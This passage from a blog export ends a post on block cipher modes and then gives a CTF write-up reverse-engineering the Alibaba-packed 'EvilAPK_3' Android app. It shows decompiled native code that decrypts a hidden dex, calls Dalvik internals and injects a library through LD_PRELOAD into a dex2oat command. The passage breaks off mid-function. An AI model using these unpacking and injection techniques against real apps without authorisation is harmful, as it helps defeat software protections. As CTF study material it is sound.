$x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。 下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \\ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。 $$C_i = head(E_K(S_{i-1}), x) \\oplus P_i \\\\P_i = head(E_K(S_{i-1}), x) \\oplus C_i \\\\S_i = ((S_{i-1} \\ll x) + C_i) mod\\ 2^n \\\\IV = S_i$$ 若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。 与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。 CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。 输出反馈（OFB）输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。 由于 XOR 操作的对称性，加密和解密操作是完全相同的： $$C_i = P_i \\oplus O_i \\\\P_i = C_i \\oplus O_i \\\\O_i = E_K(O_{i-1}) \\\\IV = O_i$$ 每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。 可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。 计数器模式（CTR）PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。 与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。 CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。 注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。 Referenceshttps://en.wikipedia.org/wiki/Block_cipher_mode_of_operation","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"blog.b3ale.cn/tags/crypto/"}]},{"title":"2014-AliCTF-EvilAPK_3","slug":"2014-AliCTF-EvilAPK_3","date":"2020-02-15T11:41:35.000Z","updated":"2020-02-19T02:44:54.523Z","comments":true,"path":"2020/02/15/2014-AliCTF-EvilAPK_3/","link":"","permalink":"blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/","excerpt":"接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。","text":"接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。 Analysis（classes.dex）这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.ali.tg.testapp\" android:versionCode=\"1\" android:versionName=\"1.0\"&gt; &lt;uses-sdk android:minSdkVersion=\"8\" android:targetSdkVersion=\"9\" /&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt; &lt;application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@drawable/ic_launcher\" android:name=\"com.ali.mobisecenhance.StubApplication\" android:debuggable=\"true\" android:allowBackup=\"true\"&gt; &lt;activity android:label=\"@string/app_name\" android:name=\".MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\".WebViewActivity\" /&gt; &lt;/application&gt;&lt;/manifest&gt; 在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行： 12345678910111213141516package com.ali.mobisecenhance;import android.app.Application;import android.content.Context;public class StubApplication extends Application &#123; private native void b(ClassLoader classLoader, Context context); protected native void attachBaseContext(Context context); public native void onCreate(); static &#123; System.loadLibrary(\"mobisec\"); &#125;&#125; 可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件： 12345678910111213141516171819202122232425262728293031323334353637383940$ tree ..├── AndroidManifest.xml├── META-INF│ ├── MANIFEST.MF│ ├── TEST.RSA│ └── TEST.SF├── assets│ ├── cls.jar│ └── fak.jar├── classes.dex├── lib│ ├── armeabi│ │ ├── libhack.so│ │ ├── libmobisec.so│ │ └── libtranslate.so│ ├── armeabi-v7a│ │ ├── libhack.so│ │ ├── libmobisec.so│ │ └── libtranslate.so│ └── x86│ ├── libhack.so│ ├── libmobisec.so│ └── libtranslate.so├── res│ ├── drawable-hdpi│ │ ├── android.jpg│ │ └── android1.jpg│ ├── drawable-mdpi│ │ └── ic_launcher.png│ ├── drawable-xhdpi│ │ └── ic_launcher.png│ ├── drawable-xxhdpi│ │ └── ic_launcher.png│ └── layout│ ├── activity_main.xml│ └── webviewlayout.xml└── resources.arsc12 directories, 24 files file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件： 12345$ file cls.jarcls.jar: data$ file fak.jarfak.jar: Zip archive data, at least v?[0x314] to extract 经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。 Analysis（libmobisec.so）打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数： 12345678910111213141516171819202122232425262728signed int __fastcall JNI_OnLoad(_JavaVM *vm, int a2)&#123; const char *v2; // r2 jclass v3; // r1 signed int result; // r0 bool v5; // zf _JNIEnv *env; // [sp+4h] [bp-Ch] env = (_JNIEnv *)a2; if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65542) ) &#123; v2 = \"Failed to get the environment\";LABEL_5: _android_log_print(6, \"debug\", v2); return -1; &#125; v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, \"com/ali/mobisecenhance/StubApplication\");// locate class if ( !v3 ) &#123; v2 = \"failed to get class reference\"; goto LABEL_5; &#125; v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (const JNINativeMethod *)gMethods, 2) == 0;// register 2 methods result = 65542; if ( !v5 ) result = -1; return result;&#125; 在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针： 12345678.data:00054010 gMethods DCD aAttachbasecont_0 ; DATA XREF: JNI_OnLoad+44↑o.data:00054010 ; .text:off_24784↑o.data:00054010 ; &quot;attachBaseContext&quot;.data:00054014 DCD aLandroidConten_1 ; &quot;(Landroid/content/Context;)V&quot;.data:00054018 DCD sub_24D3C+1.data:0005401C DCD aOncreate ; &quot;onCreate&quot;.data:00054020 DCD aV ; &quot;()V&quot;.data:00054024 DCD sub_24498+1 因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135int __fastcall attachBaseContext(_JNIEnv *a1, jobject *a2, jobject *a3)&#123; jobject *v3; // r8 jobject *v4; // r10 _JNIEnv *env; // r4 _JNIEnv *v6; // r1 int v7; // r2 int result; // r0 ali *v9; // r0 int v10; // r0 int v11; // r0 int v12; // r0 int v13; // r5 int v14; // r0 int v15; // r0 int v16; // r0 int v17; // r0 int v18; // r0 char *v19; // r0 int v20; // r0 int v21; // r0 void *v22; // r0 void *v23; // r8 const char *v24; // r0 const char *v25; // r5 size_t v26; // r0 int v27; // r5 int v28; // r8 int v29; // r0 int v30; // r5 const char *v31; // r2 int v32; // r0 ali *v33; // r0 int v34; // r4 unsigned __int64 v35; // r2 int v36; // [sp+8h] [bp-78h] __int64 v37; // [sp+18h] [bp-68h] char v38; // [sp+24h] [bp-5Ch] char v39; // [sp+3Ch] [bp-44h] char *v40; // [sp+4Ch] [bp-34h] char *v41; // [sp+50h] [bp-30h] v3 = a2; v4 = a3; env = a1; _android_log_print(6, \"debug\", \"in...\"); result = ali::init_classes(env, v6, v7); // init classes if ( result ) return result; v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4); v36 = ali::NanoTime(v9); v10 = _JNIEnv::GetObjectClass(env, v3); v11 = _JNIEnv::GetMethodID(env, v10, \"getFilesDir\", \"()Ljava/io/File;\"); v12 = _JNIEnv::CallObjectMethod(env, v3, v11); v13 = v12; v14 = _JNIEnv::GetObjectClass(env, v12); v15 = _JNIEnv::GetMethodID(env, v14, \"getAbsolutePath\", \"()Ljava/lang/String;\"); v16 = _JNIEnv::CallObjectMethod(env, v13, v15); sub_247D8(&amp;v39, env, v16); if ( &amp;v39 != (char *)&amp;ali::g_filePath ) std::string::_M_assign((std::string *)&amp;ali::g_filePath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); _android_log_print(3, \"debug\", \"global files path is %s\", dword_540E8); v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4); if ( ali::sdk_int &lt;= 8 ) &#123; v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C); sub_247D8(&amp;v38, env, v20); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, \"/lib\"); if ( &amp;v39 != (char *)&amp;ali::g_libPath ) std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); v19 = &amp;v38; &#125; else &#123; v18 = _JNIEnv::GetObjectField(env, v17, dword_54170); sub_247D8(&amp;v39, env, v18); if ( &amp;v39 != (char *)&amp;ali::g_libPath ) std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40); v19 = &amp;v39; &#125; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v19); _android_log_print(3, \"debug\", \"global native path is %s\", dword_540D0); v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0); sub_247D8(&amp;v39, env, v21); if ( &amp;v39 != (char *)&amp;ali::g_apkPath ) std::string::_M_assign((std::string *)&amp;ali::g_apkPath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); setenv(\"APKPATH\", (const char *)dword_540B8, 1); _android_log_print(3, \"debug\", \"global apk path is %s\", dword_540B8); sub_24A64(env, v3); v22 = (void *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0); v23 = v22; if ( v22 ) &#123; v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, 0); v25 = v24; v26 = strlen(v24); std::string::_M_assign((std::string *)&amp;ali::g_pkgName, v25, &amp;v25[v26]); env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25); &#125; v37 = 0LL; v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8); parse_dex(env, &amp;v37); // parse dex? replace_classloader_cookie(env, v27, v37, HIDWORD(v37)); _android_log_print(3, \"debug\", \"enter new application\");// enter MainActivity? v28 = dword_54120; _JNIEnv::NewStringUTF(env, \"android.app.Application\"); v29 = _JNIEnv::CallObjectMethod(env, v27, v28); v30 = v29; if ( v29 ) &#123; v32 = _JNIEnv::GetMethodID(env, v29, \"&lt;init&gt;\", \"()V\"); dword_540A0 = _JNIEnv::NewObject(env, v30, v32); _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4); _JNIEnv::DeleteLocalRef(env, v30); v31 = \"exit new application\"; &#125; else &#123; v31 = \"can't findClass realAppClass\"; &#125; v33 = (ali *)_android_log_print(3, \"debug\", v31); if ( dword_540A0 ) &#123; v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0); dword_540A0 = (int)v33; &#125; v34 = ali::NanoTime(v33); _android_log_print(3, \"debug\", \"##### attachBaseContext spent:\"); ali::PrettyDuration((ali *)(v34 - v36), v35); result = _android_log_print(3, \"debug\", \"exit attachBaseContext\"); return result;&#125; 接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328signed int __fastcall parse_dex(_JNIEnv *a1, __int64 *a2)&#123; int v2; // r7 const char *v3; // r1 char *v4; // r0 char *v5; // r9 unsigned __int8 *v6; // r3 int v7; // r2 int v8; // t1 int fd; // ST14_4 int v10; // r8 int v11; // r7 int v12; // r5 int v13; // r0 int v14; // r5 int v15; // r0 int v16; // r7 int v17; // r1 int v18; // r5 int (__fastcall *v19)(int, signed int); // r5 int v20; // r5 unsigned __int8 *v21; // r8 const char *v22; // r3 char *v23; // r0 char *v24; // r0 char *v25; // r6 ali::EncFile *v26; // r7 int v27; // r0 int *v28; // r0 char *v29; // r0 int v30; // r10 void *v31; // r7 int (__fastcall *v32)(unsigned __int8 *, int, signed int *); // r9 int (__fastcall *v33)(_DWORD); // r7 const char *v34; // r2 int v35; // r9 signed int v36; // r7 _DWORD *v37; // r9 _BYTE *v38; // r5 unsigned __int8 *v39; // r3 void *v40; // r0 JNINativeMethod *v41; // r0 unsigned __int8 *v42; // r3 signed int v43; // r3 _JNIEnv *v45; // [sp+8h] [bp-2A0h] __int64 *v46; // [sp+10h] [bp-298h] int v47; // [sp+24h] [bp-284h] unsigned __int8 *v48; // [sp+28h] [bp-280h] unsigned __int8 *v49; // [sp+2Ch] [bp-27Ch] void (__cdecl *v50)(const unsigned int *, jvalue *); // [sp+30h] [bp-278h] char v51; // [sp+34h] [bp-274h] signed int v52[2]; // [sp+38h] [bp-270h] char s; // [sp+40h] [bp-268h] char v54; // [sp+54h] [bp-254h] int v55; // [sp+64h] [bp-244h] int v56; // [sp+68h] [bp-240h] char v57; // [sp+6Ch] [bp-23Ch] const char *v58; // [sp+80h] [bp-228h] char v59; // [sp+84h] [bp-224h] const char *v60; // [sp+98h] [bp-210h] char v61; // [sp+9Ch] [bp-20Ch] unsigned int v62; // [sp+B0h] [bp-1F8h] char v63; // [sp+B4h] [bp-1F4h] char v64; // [sp+CCh] [bp-1DCh] int v65; // [sp+E0h] [bp-1C8h] char v66; // [sp+E4h] [bp-1C4h] char v67; // [sp+FCh] [bp-1ACh] const char *v68; // [sp+110h] [bp-198h] char v69; // [sp+114h] [bp-194h] char v70; // [sp+12Ch] [bp-17Ch] const char *v71; // [sp+140h] [bp-168h] char v72; // [sp+144h] [bp-164h] char *v73; // [sp+154h] [bp-154h] char *v74; // [sp+158h] [bp-150h] char v75; // [sp+15Ch] [bp-14Ch] char v76; // [sp+174h] [bp-134h] char v77; // [sp+18Ch] [bp-11Ch] char v78; // [sp+1A4h] [bp-104h] char v79; // [sp+1BCh] [bp-ECh] char v80; // [sp+1D4h] [bp-D4h] char v81; // [sp+1ECh] [bp-BCh] char v82; // [sp+204h] [bp-A4h] char v83; // [sp+21Ch] [bp-8Ch] char v84; // [sp+234h] [bp-74h] int v85; // [sp+244h] [bp-64h] unsigned __int8 *v86; // [sp+248h] [bp-60h] char v87; // [sp+24Ch] [bp-5Ch] char v88; // [sp+264h] [bp-44h] char *v89; // [sp+274h] [bp-34h] char *v90; // [sp+278h] [bp-30h] v45 = a1; v46 = a2; _android_log_print(3, \"debug\", \"enter parse_dex\"); if ( ali::isDalvik ) // dalvik or art &#123; v47 = 0; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;ali::g_filePath, \"/cls.jar\");// locate cls.jar v25 = v90; v26 = (ali::EncFile *)operator new(0xCu); ali::EncFile::EncFile(v26, v25); v48 = 0; v49 = 0; if ( ali::sdk_int &gt; 13 ) // sdk version &gt; 13 &#123; v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (unsigned int *)&amp;v47, 0x10u); v49 = v48 + 16; &#125; else // sdk version &lt;= 13 ( android 3.x ) &#123; v27 = ali::EncFile::open(v26, &amp;v49, (unsigned int *)&amp;v47); &#125; if ( v49 == (unsigned __int8 *)-1 ) &#123; v28 = (int *)_errno(v27); v29 = strerror(*v28); _android_log_print(3, \"debug\", \"mmap dex file :%s\", v29);LABEL_45: v24 = &amp;v88; goto LABEL_46; &#125; v30 = *((_DWORD *)v49 + 8); if ( ali::sdk_int &gt; 13 ) // sdk version &gt; 13 &#123; v40 = dlopen(\"libdvm.so\", 1); // open libdvm.so and start execute program v41 = (JNINativeMethod *)dlsym(v40, \"dvm_dalvik_system_DexFile\"); v50 = 0; lookup(v41, \"openDexFile\", \"([B)I\", &amp;v50); v42 = v48; *((_DWORD *)v48 + 2) = v47; *(_DWORD *)&amp;v51 = v42; ((void (*)(void))v50)(); v43 = v52[0]; *v46 = v52[0]; *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 32) = *(_DWORD *)(v43 + 16); *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 36) = v47; ali::EncFile::~EncFile(v26); operator delete((void *)v26); &#125; else // sdk version &lt;= 13 ( android 3.x ) &#123; v31 = dlopen(\"libdvm.so\", 1); v32 = (int (__fastcall *)(unsigned __int8 *, int, signed int *))dlsym(v31, \"dvmDexFileOpenPartial\"); v33 = (int (__fastcall *)(_DWORD))dlsym(v31, \"dexCreateClassLookup\"); v52[0] = 0; if ( v32(v49, v30, v52) == -1 ) &#123; v34 = \"dvmDexFileOpenPartial error\";LABEL_40: _android_log_print(3, \"debug\", v34); goto LABEL_45; &#125; v35 = *(_DWORD *)v52[0]; *(_DWORD *)(v35 + 36) = v33(*(_DWORD *)v52[0]); v36 = v52[0]; if ( !*(_DWORD *)(*(_DWORD *)v52[0] + 36) ) &#123; v34 = \"dexCreateClassLookup error\"; goto LABEL_40; &#125; v37 = malloc(0x2Cu); v38 = malloc(0x14u); strdup((const char *)&amp;unk_4CEE9); v38[4] = 0; v38[5] = 0; *((_DWORD *)v38 + 2) = 0; v39 = v49; *(_DWORD *)v38 = v38; *((_DWORD *)v38 + 3) = v37; v37[10] = v36; *(_DWORD *)(v36 + 32) = v39; *(_DWORD *)(v36 + 36) = v47; *v46 = (signed int)v38; &#125; v23 = &amp;v88; goto LABEL_44; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v54, &amp;ali::g_filePath, \"/cls.jar\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v57, &amp;ali::g_filePath, \"/cls.dex\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v59, &amp;ali::g_filePath, \"/fak.jar\"); _android_log_print(3, \"debug\", \"before oat gen\"); if ( !access(v58, 0) ) goto LABEL_24; v2 = android_getCpuFamily(); std::string::string(&amp;v63, \"arm\", &amp;v51); switch ( v2 ) &#123; case 1: v3 = \"arm\";LABEL_5: std::string::operator=(&amp;v63, v3); break; case 2: v3 = \"x86\"; goto LABEL_5; case 3: case 6: v3 = \"mips\"; goto LABEL_5; case 4: v3 = \"arm64\"; goto LABEL_5; case 5: v3 = \"x86_64\"; goto LABEL_5; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v64, &amp;ali::g_libPath, \"/libhack.so\"); v4 = getenv(\"LD_PRELOAD\"); v5 = v4; if ( v4 ) &#123; _android_log_print(3, \"debug\", \"the system already define LD_PRELOAD=%s\", v4); std::string::string(&amp;v84, v5, v52); v6 = v86; v7 = v85; while ( v6 != (unsigned __int8 *)v7 ) &#123; v8 = *v6++; if ( v8 == 32 ) *(v6 - 1) = 58; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v87, &amp;v84, \":\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;v87, &amp;v64); std::string::_M_assign((std::string *)&amp;v64, v90, v89); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v88); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v87); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84); &#125; _android_log_print(3, \"debug\", \"the new LD_PRELOAD is %s\", v65); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v66, &amp;ali::g_filePath, \"/juice.data\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v67, &amp;ali::g_filePath, \"/fak.jar\"); fd = open(v68, 0); memset(&amp;s, 0, 0x14u); sprintf(&amp;s, \"%d\", fd); std::string::string(&amp;v69, &amp;s, v52); v73 = &amp;v72; v74 = &amp;v72; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + 10); *v73 = 0; std::string::_M_appendT&lt;char const*&gt;(&amp;v72, \"DEX_FILE=\", \"\", v52); std::string::append((std::string *)&amp;v72, (const std::string *)&amp;v54); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v75, &amp;v72, \" JUICE_FILE=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v76, &amp;v75, &amp;v66); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v77, &amp;v76, \" LD_PRELOAD=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v78, &amp;v77, &amp;v64); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;( &amp;v79, &amp;v78, \" /system/bin/dex2oat \\t\\t\\t\\t \\t --runtime-arg -Xms64m \\t\\t\\t\\t\\t --runtime-arg -Xmx64m \\t\\t\\t\\t\" \"\\t --boot-image=/system/framework/boot.art --zip-fd=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v80, &amp;v79, &amp;v69); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v81, &amp;v80, \"\\t\\t\\t\\t\\t --zip-location=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v82, &amp;v81, &amp;v67); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v83, &amp;v82, \"\\t\\t\\t\\t\\t --oat-file=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v84, &amp;v83, &amp;v57); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v70, &amp;v84, \" \"); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v83); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v82); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v81); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v80); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v79); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v78); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v77); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v76); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v75); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v72); _android_log_print(3, \"debug\", \"cmd is %s\", v71); system(v71); close(fd); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v70); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v69); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v67); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v66); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v64); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v63);LABEL_24: _android_log_print(3, \"debug\", \"after oat gen\"); v10 = ali::JDexFile; v11 = dword_54140; if ( ali::sdk_int &lt;= 19 ) // sdk version &lt;= 19 &#123; v12 = _JNIEnv::NewStringUTF(v45, v60); v13 = _JNIEnv::NewStringUTF(v45, v58); v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, 0); v18 = 0; &#125; else // sdk version &gt; 19 &#123; v14 = _JNIEnv::NewStringUTF(v45, v60); v15 = _JNIEnv::NewStringUTF(v45, v58); v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, 0); v18 = v17; &#125; _android_log_print(3, \"debug\", \"cookie is %llx\"); *(_DWORD *)v46 = v16; *((_DWORD *)v46 + 1) = v18; v19 = (int (__fastcall *)(int, signed int))dlsym((void *)0xFFFFFFFF, \"_ZNK3art7DexFile12FindClassDefEt\"); _android_log_print(3, \"debug\", \"DexFile::FindClassDefFn is %p\", v19); v20 = v19(v16, 1); _android_log_print(3, \"debug\", \"call FindClassDefFn(%p,%d) =&gt; %p\", v16, 1, v20); _android_log_print(3, \"debug\", \"dex position is %p\", v20 - 572); _android_log_print(3, \"debug\", \"dex head is %08x %08x\", *(_DWORD *)(v20 - 572), *(_DWORD *)(v20 - 568)); v21 = *(unsigned __int8 **)(v20 - 540); _android_log_print(3, \"debug\", \"dex size is %d\", v21); MemEnableWrite((unsigned __int8 *)(v20 - 572), &amp;v21[v20 - 572]); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v61, &amp;ali::g_filePath, \"/juice.data\"); if ( !ali::dex_juicer_patch((ali *)(v20 - 572), v21, v62, v22) ) &#123; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59); 